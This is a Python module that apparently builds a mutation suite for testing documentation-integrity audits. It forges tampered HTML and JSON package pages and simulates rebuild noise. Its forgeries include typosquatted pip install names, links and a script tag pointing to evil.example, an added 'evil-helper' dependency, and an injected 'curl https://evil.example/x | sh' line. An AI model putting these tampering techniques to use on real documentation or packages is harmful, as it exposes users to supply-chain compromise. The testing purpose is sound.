"""Forged edits and build noise for evaluating audits (mutation suite).

`forge(content, kind)` makes the small, targeted edits a dishonest peer would make: a typosquatted
install command, a redirected link, an injected code line or script, a bumped version, a negated
sentence, or (the M3 original) an appended HTML comment. Each returns None when the page has
nothing to edit of that kind.

`rebuild_noise(content, seed)` imitates what a documentation rebuild changes without changing the
documentation: build IDs in comments, CSRF tokens, analytics IDs, "last updated" lines,
Sphinx `?v=` cache busters and copyright years. Used to stress-test audits beyond the drift seen
in a short real re-fetch window."""

from __future__ import annotations

import json
import random
import re

from bs4 import BeautifulSoup, Comment

from .canonical import DROP_CLASSES, DROP_TAGS, MAIN_SELECTORS, digest

FORGERIES = ("install", "href", "code", "version", "script", "prose", "comment", "json_url",
             "json_requires")  # fmt: skip
EVIL = "evil.example"


def _swap(name: str) -> str:
    """Typosquat: swap the two middle letters, e.g. requests -> reqeusts."""
    if len(name) < 3:
        return name + "s"
    i = len(name) // 2
    swapped = name[: i - 1] + name[i] + name[i - 1] + name[i + 1 :]
    return swapped if swapped != name else name + "-dev"


def _html(content: bytes, kind: str) -> bytes | None:
    def search(pattern: bytes):
        return re.search(pattern, content)

    if kind == "install":
        m = search(rb"(pip3?\s+install\s+(?:-U\s+)?)([A-Za-z][A-Za-z0-9_.-]+)")
        if not m:
            return None
        return content[: m.start(2)] + _swap(m.group(2).decode()).encode() + content[m.end(2) :]
    if kind == "href":
        m = search(rb'href="https?://([^/"]+)')
        if not m:
            return None
        return content[: m.start(1)] + EVIL.encode() + content[m.end(1) :]
    if kind == "code":
        m = search(rb"<pre[^>]*>")
        if not m:
            return None
        line = b"import os; os.system('curl https://evil.example/x | sh')\n"
        return content[: m.end()] + line + content[m.end() :]
    if kind == "version":
        m = search(rb"(?<![\d.])(\d+)\.(\d+)\.(\d+)(?![\d.])")
        if not m:
            return None
        bumped = f"{m.group(1).decode()}.{m.group(2).decode()}.{int(m.group(3)) + 1}".encode()
        return content[: m.start()] + bumped + content[m.end() :]
    if kind == "script":
        tag = f'<script src="https://{EVIL}/x.js"></script>'.encode()
        i = content.rfind(b"</body>")
        return content + tag if i < 0 else content[:i] + tag + content[i:]
    if kind == "prose":
        m = search(rb"<p>([^<]*?)\b(is|are|can|should|will)\b")
        if not m:
            return None
        return content[: m.end()] + b" not" + content[m.end() :]
    if kind == "comment":
        return content + b"\n<!-- altered install command -->"
    return None


def _json(content: bytes, kind: str) -> bytes | None:
    try:
        data = json.loads(content)
    except ValueError:
        return None
    info = data.get("info") or {}
    if kind == "json_url":
        urls = info.get("project_urls") or {}
        if not urls:
            return None
        key = sorted(urls)[0]
        urls[key] = f"https://{EVIL}/docs"
    elif kind == "json_requires":
        info["requires_dist"] = (info.get("requires_dist") or []) + ["evil-helper>=0.1"]
    elif kind == "version":
        if not info.get("version"):
            return None
        info["version"] = info["version"] + ".post1"
    else:
        return None
    data["info"] = info
    return json.dumps(data).encode()


def is_json(content: bytes) -> bool:
    return content.lstrip()[:1] in (b"{", b"[")


def forge(content: bytes, kind: str) -> bytes | None:
    """Edit the first match anywhere in the raw page (head and page chrome included)."""
    return _json(content, kind) if is_json(content) else _html(content, kind)


CONTENT_FORGERIES = ("install", "href", "code", "version", "prose")
_VERSION = re.compile(r"(?<![\d.])(\d+)\.(\d+)\.(\d+)(?![\d.])")
_INSTALL = re.compile(r"(pip3?\s+install\s+(?:-U\s+)?)([A-Za-z][A-Za-z0-9_.-]+)")
_PROSE = re.compile(r"\b(is|are|can|should|will)\b")


def _kept(el, root) -> bool:
    """Would canonical.html_blocks keep this element (not inside dropped chrome)?"""
    for node in [el, *el.parents]:
        if node is root:
            return True
        name = getattr(node, "name", None)
        if name in DROP_TAGS:
            return False
        cls = " ".join(node.get("class") or []) if hasattr(node, "get") else ""
        if cls and DROP_CLASSES.search(cls):
            return False
    return False


def forge_content(content: bytes, kind: str) -> bytes | None:
    """Make the edit inside the content the canonicalizer keeps (main container, chrome
    excluded), on a parsed and re-serialized page. Returns None when the page has nothing to
    edit there, or when re-serializing the unedited page already changes its digest (so that a
    detection is always caused by the edit itself)."""
    if is_json(content):
        return None
    soup = BeautifulSoup(content, "lxml")
    root = next((r for sel in MAIN_SELECTORS if (r := soup.select_one(sel)) is not None), None)
    if root is None or digest(str(soup).encode()).root != digest(content).root:
        return None
    done = False
    if kind == "href":
        for a in root.find_all("a", href=True):
            m = re.match(r"(https?://)([^/]+)(.*)", a["href"].strip())
            if m and _kept(a, root):
                a["href"] = m.group(1) + EVIL + m.group(3)
                done = True
                break
    elif kind == "code":
        for pre in root.find_all("pre"):
            if _kept(pre, root) and pre.get_text().strip():
                pre.insert(0, "import os; os.system('curl https://evil.example/x | sh')\n")
                done = True
                break
    else:
        pattern = {"install": _INSTALL, "version": _VERSION, "prose": _PROSE}[kind]
        for node in root.find_all(string=pattern):
            if isinstance(node, Comment) or node.parent is None:
                continue
            if kind == "prose" and node.parent.name != "p":
                continue
            if not _kept(node.parent, root):
                continue
            m = pattern.search(node)
            if kind == "install":
                new = node[: m.start(2)] + _swap(m.group(2)) + node[m.end(2) :]
            elif kind == "version":
                bumped = f"{m.group(1)}.{m.group(2)}.{int(m.group(3)) + 1}"
                new = node[: m.start()] + bumped + node[m.end() :]
            else:
                new = node[: m.end()] + " not" + node[m.end() :]
            node.replace_with(new)
            done = True
            break
    return str(soup).encode() if done else None


def rebuild_noise(content: bytes, seed: int) -> bytes:
    rng = random.Random(seed)
    tok = f"{rng.getrandbits(96):024x}"
    if is_json(content):
        try:
            data = json.loads(content)
        except ValueError:
            return content
        data["last_serial"] = rng.randrange(10**7, 10**8)
        return json.dumps(data).encode()
    day = f"{rng.randrange(1, 28):02d}"
    out = re.sub(rb"(\.(?:js|css))\?v=[0-9a-f]+", rb"\1?v=" + tok[:8].encode(), content)
    noise_head = (
        f'<meta name="csrf-token" content="{tok}"><script>window.analyticsId="{tok[:12]}";</script>'
    ).encode()
    noise_body = (
        f"<!-- build {tok} -->"
        f'<div class="last-updated"><p>Last updated on Nov {day}, 2026.</p></div>'
        f"<footer><p>&copy; Copyright 2001-2026. Built with Sphinx {rng.randrange(5, 9)}.0.</p>"
        f"</footer>"
    ).encode()
    m = re.search(rb'role="main"[^>]*>', out)
    if m:  # also inside the main content, where canonicalization must cope with it
        inner = f"<!-- build {tok} --><p>Last updated on Nov {day}, 2026.</p>".encode()
        out = out[: m.end()] + inner + out[m.end() :]
    i = out.find(b"</head>")
    out = out if i < 0 else out[:i] + noise_head + out[i:]
    j = out.rfind(b"</body>")
    return out + noise_body if j < 0 else out[:j] + noise_body + out[j:]
